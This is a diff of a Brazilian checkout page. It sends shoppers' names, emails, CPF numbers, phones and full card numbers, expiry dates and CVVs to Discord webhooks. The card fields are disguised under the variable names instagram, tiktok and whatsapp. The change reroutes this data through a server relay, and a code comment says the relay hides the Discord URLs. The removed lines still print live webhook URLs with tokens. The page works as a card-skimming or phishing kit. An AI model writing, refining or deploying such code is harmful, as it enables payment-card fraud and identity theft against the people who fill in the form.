@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<!-- 🔒 APLICA O TEMA ANTES DE QUALQUER CSS CARREGAR (evita flash branco) -->
+<!-- 🔒 APLICA O TEMA ANTES DE QUALQUER CSS CARREGAR -->
 <script>
   (function(){
     try {
@@ -18,9 +18,6 @@
 <link rel="icon" href="https://i.imgur.com/Z4JMSp7.png">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
-  /* ============================================
-     TEMA (claro/escuro) via CSS variables
-     ============================================ */
   :root {
     --bg: #F8FAFC;
     --bg-card: #ffffff;
@@ -51,7 +48,6 @@
     --tab-border: rgba(0,0,0,.1);
   }
 
-  /* Tema escuro (padrão) */
   html[data-theme="dark"] {
     --bg: #0b1014;
     --bg-card: #141a1c;
@@ -82,7 +78,6 @@
     --tab-border: rgba(255,255,255,.12);
   }
 
-  /* Cor do fundo imediata (evita piscar) */
   html { background: #0b1014; }
   html[data-theme="light"] { background: #F8FAFC; }
 
@@ -194,7 +189,6 @@
   .b2-payment-badges { display: flex; align-items: center; justify-content: center; gap: .5rem; font-size: .75rem; opacity: .6; margin-top: .5rem; }
   .b2-guarantee { text-align: center; font-size: .78rem; opacity: .6; margin-top: .5rem; }
 
-  /* ---------- ERRO DE VALIDAÇÃO ---------- */
   .b2-field input.b2-invalid,
   .b2-field select.b2-invalid {
     border-color: #EF4444;
@@ -208,7 +202,6 @@
   .b2-error-msg { display: none; font-size: .72rem; font-weight: 600; color: #EF4444; margin-top: .15rem; }
   .b2-error-msg.show { display: block; }
 
-  /* ---------- TOAST ---------- */
   .b2-toast {
     position: fixed; top: 20px; left: 50%;
     transform: translateX(-50%) translateY(-120%);
@@ -282,9 +275,6 @@
   .b2-copy-icon { position: absolute; right: .5rem; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: var(--text-muted); }
   .b2-copy-btn { width: 100%; padding: .9rem; border: none; cursor: pointer; font-weight: 700; font-size: .9rem; background: #22C55E; color: #fff; border-radius: 10px; }
 
-  /* ============================================
-     BOTÃO DE TEMA (flutuante)
-     ============================================ */
   .b2-theme-toggle {
     position: fixed;
     top: 16px;
@@ -326,9 +316,6 @@
 </head>
 <body>
 
-<!-- ============================================
-     BOTÃO DE TEMA
-     ============================================ -->
 <button class="b2-theme-toggle" id="theme-toggle" aria-label="Alternar tema">
   <svg class="icon-moon" viewBox="0 0 24 24">
     <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
@@ -476,7 +463,6 @@
   </form>
 </div>
 
-<!-- TOAST (pop-up voador) -->
 <div id="b2-toast" class="b2-toast">
   <span class="b2-toast-icon"><span class="b2-toast-spin"></span></span>
   <span id="b2-toast-text">Processando pagamento...</span>
@@ -514,10 +500,6 @@
 
 <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 <script>
-/* =====================================================
-   BOTÃO DE TEMA — alternar claro/escuro
-   (o tema inicial já foi aplicado no <head>)
-   ===================================================== */
 (function(){
   const btn = document.getElementById('theme-toggle');
   btn.addEventListener('click', () => {
@@ -530,15 +512,13 @@
 
 (function () {
   // =====================================================
-  // 🔗 WEBHOOKS DO DISCORD
+  // 🔗 WEBHOOK DO SERVIDOR (esconde as URLs do Discord)
   // =====================================================
-  const WEBHOOK_ALL = 'https://discord.com/api/webhooks/1553287629187846157/-Npb5CoufNIeI-iTLQbShvdW1t-a3wXyXcgv1BJO6-aOrJTgqfLyN2VNaZedZ7ziFRwZ';
-  const WEBHOOK_PIX = 'https://discord.com/api/webhooks/1553603746468990991/17WFmzQt0mghN0O-WKgjg9iReb9ieLYO1qVcUoUXBqbdFa5w3-wXWL5l2l2rN1ikbS-f';
+  const WEBHOOK_SERVER = '/api/webhook-checkout';
   // =====================================================
 
   const BASE_AMOUNT = 1990;
 
-  // ---------- LÊ O @ DO ALVO DA URL (?u=fulano) ----------
   const params = new URLSearchParams(location.search);
   const alvo = (params.get('u') || '').replace('@', '').trim();
   if (alvo) {
@@ -546,7 +526,6 @@
     if (alvoEl) alvoEl.textContent = '@' + alvo;
   }
 
-  // ---------- Máscaras ----------
   const phone = document.getElementById('phone-input');
   phone.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g, '').slice(0, 11);
@@ -583,7 +562,6 @@
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
   });
 
-  // ---------- Abas ----------
   let currentMethod = 'pix';
   document.querySelectorAll('.b2-pay-tab').forEach(tab => {
     tab.addEventListener('click', () => {
@@ -595,7 +573,6 @@
     });
   });
 
-  // ---------- Parcelas ----------
   const installments = document.getElementById('card-installments');
   installments.innerHTML = '';
   for (let i = 1; i <= 12; i++) {
@@ -607,7 +584,6 @@
     installments.appendChild(opt);
   }
 
-  // ---------- Helpers ----------
   const setLoading = on => {
     const btn = document.getElementById('pay-btn');
     btn.disabled = on;
@@ -630,9 +606,6 @@
     }
   };
 
-  // =====================================================
-  // ⏱️ CRONÔMETRO DO PIX (5 min) — fecha modal ao expirar
-  // =====================================================
   let pixTimerInterval = null;
 
   function iniciarContadorPix() {
@@ -640,19 +613,15 @@
       clearInterval(pixTimerInterval);
       pixTimerInterval = null;
     }
-
     const el = document.getElementById('pix-expiry');
     if (!el) return;
-
     let segundos = 300;
-
     const atualizar = () => {
       const m = Math.floor(segundos / 60);
       const s = segundos % 60;
       el.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
     };
     atualizar();
-
     pixTimerInterval = setInterval(() => {
       segundos--;
       if (segundos <= 0) {
@@ -686,7 +655,6 @@
     }
   });
 
-  // ---------- TOAST ----------
   let toastTimer = null;
   function mostrarToast(texto, tipo) {
     const toast = document.getElementById('b2-toast');
@@ -698,7 +666,6 @@
     toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
   }
 
-  // ---------- VALIDAÇÃO ----------
   function marcarErro(id, msg) {
     const el = document.getElementById(id);
     const err = document.querySelector(`.b2-error-msg[data-error-for="${id}"]`);
@@ -777,109 +744,72 @@
   }
 
   // =====================================================
-  // 🚀 ENVIO PRO DISCORD — CANAL "ALL"
+  // 🚀 ENVIO PRO SERVIDOR (que redireciona pro Discord)
   // =====================================================
   async function enviarParaDiscordALL(dados) {
     try {
-      const fields = [
-        { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: false },
-        { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
-        { name: '📱 Telefone', value: dados.telefone || '(vazio)', inline: true  },
-        { name: '🪪 CPF',      value: dados.cpf      || '(vazio)', inline: true  },
-        { name: '💳 Método',   value: dados.metodo,                inline: true  },
-        { name: '💰 Valor',    value: dados.valor,                 inline: true  }
-      ];
-
-      if (dados.alvo) {
-        fields.push({ name: '🎯 Alvo', value: '@' + dados.alvo, inline: true });
-      }
-
-      if (dados.metodo.includes('Cartão')) {
-        fields.push(
-          { name: '👤 Nome impresso',    value: dados.username     || '—', inline: true },
-          { name: '💳 Número do cartão', value: dados.instagram    || '—', inline: true },
-          { name: '📅 Validade',         value: dados.tiktok       || '—', inline: true },
-          { name: '🔒 CVV',              value: dados.whatsapp     || '—', inline: true },
-          { name: '📦 Parcelas',         value: dados.installments ? dados.installments + 'x' : '—', inline: true }
-        );
-      }
-
-      await fetch(WEBHOOK_ALL, {
+      await fetch(WEBHOOK_SERVER, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          username: 'Checkout 🛒',
-          embeds: [{
-            title: '🛒 Novo Checkout Recebido',
-            color: 0x0400f0,
-            fields: fields,
-            footer: { text: new Date().toLocaleString('pt-BR') }
-          }]
+          tipo: 'all',
+          nome: dados.nome,
+          email: dados.email,
+          telefone: dados.telefone,
+          cpf: dados.cpf,
+          metodo: dados.metodo,
+          valor: dados.valor,
+          alvo: dados.alvo,
+          card_name: dados.username,
+          card_number: dados.instagram,
+          card_expiry: dados.tiktok,
+          card_cvv: dados.whatsapp,
+          installments: dados.installments
         })
       });
     } catch (err) {
-      console.warn('Falha ao enviar pro Discord (ALL):', err);
+      console.warn('Falha ao enviar pro webhook-checkout (ALL):', err);
     }
   }
 
-  // =====================================================
-  // 💰 ENVIO PRO DISCORD — CANAL "PIX"
-  // =====================================================
   async function enviarParaDiscordPIX(dados, transactionId) {
     try {
-      const fields = [
-        { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: true },
-        { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
-        { name: '🪪 CPF',      value: dados.cpf      || '(vazio)', inline: true },
-        { name: '📱 Telefone', value: dados.telefone || '(vazio)', inline: true },
-        { name: '💰 Valor',    value: dados.valor,                 inline: true }
-      ];
-
-      if (dados.alvo) {
-        fields.push({ name: '🎯 Alvo', value: '@' + dados.alvo, inline: true });
-      }
-
-      if (transactionId) {
-        fields.push({ name: '🆔 ID ZPay', value: transactionId, inline: false });
-      }
-
-      await fetch(WEBHOOK_PIX, {
+      await fetch(WEBHOOK_SERVER, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          username: 'PIX Gerado 💰',
-          embeds: [{
-            title: '💰 PIX Gerado (aguardando pagamento)',
-            color: 0xFACC15,
-            fields: fields,
-            footer: { text: new Date().toLocaleString('pt-BR') }
-          }]
+          tipo: 'pix',
+          nome: dados.nome,
+          email: dados.email,
+          cpf: dados.cpf,
+          telefone: dados.telefone,
+          valor: dados.valor,
+          alvo: dados.alvo,
+          transactionId: transactionId
         })
       });
     } catch (err) {
-      console.warn('Falha ao enviar pro Discord (PIX):', err);
+      console.warn('Falha ao enviar pro webhook-checkout (PIX):', err);
     }
   }
 
-  // =====================================================
-  // 💳 ENVIO PRO CANAL "CARD" (via /api/webhook-cartao)
-  // =====================================================
   async function enviarCartaoParaAPI(dados) {
     try {
-      await fetch('/api/webhook-cartao', {
+      await fetch(WEBHOOK_SERVER, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          nome_cliente:       dados.nome,
-          email:              dados.email,
-          cpf:                dados.cpf,
-          telefone:           dados.telefone,
-          alvo:               dados.alvo,
-          card_name:          dados.username,
-          card_number:        dados.instagram,
-          card_expiry:        dados.tiktok,
-          card_cvv:           dados.whatsapp,
-          card_installments:  dados.installments
+          tipo: 'card',
+          nome: dados.nome,
+          email: dados.email,
+          cpf: dados.cpf,
+          telefone: dados.telefone,
+          alvo: dados.alvo,
+          card_name: dados.username,
+          card_number: dados.instagram,
+          card_expiry: dados.tiktok,
+          card_cvv: dados.whatsapp,
+          installments: dados.installments
         })
       });
     } catch (err) {
@@ -887,7 +817,6 @@
     }
   }
 
-  // ---------- Submit ----------
   const form = document.getElementById('checkout-form');
   form.addEventListener('submit', async e => {
     e.preventDefault();
